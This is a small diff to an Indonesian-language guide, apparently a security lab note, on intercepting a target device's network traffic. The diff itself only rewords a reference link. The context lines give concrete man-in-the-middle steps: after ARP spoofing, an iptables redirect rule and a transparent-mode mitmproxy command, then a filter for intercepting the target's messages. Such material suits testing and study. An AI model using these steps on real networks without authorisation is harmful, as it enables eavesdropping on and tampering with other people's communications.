@@ -14,6 +14,6 @@ Sebelum memulai tahapan ini, perangkat manapun yang ditargetkan diharuskan telah
 - setelah proses ARP Spoofing berhasil dijalankan, selanjutnya dilakukan perintah berikut:
    1. sudo iptables -t nat -A PREROUTING -i eth0 -p tcp --dport [isi-Port-target] -j REDIRECT --to-port 8081
    2. mitmproxy --mode transparent --showhost -p 8081 -k --tcp-hosts ".*"
-- Reference: https://github.com/nmatt0/mitmtools
+- Reference related to use MITM tools: https://github.com/nmatt0/mitmtools
   
 - Setelahnya akan diarahkan ke flows panel pada tools MITM Proxy, didalam flows panel tersebut akan terdapat isi komunikasi yang dilakukan oleh target. dan untuk melakukan intercept pada salah satu data komunikasi diperlukan menggunakan perintah: ~b [isi-format-topik-data-target] . 
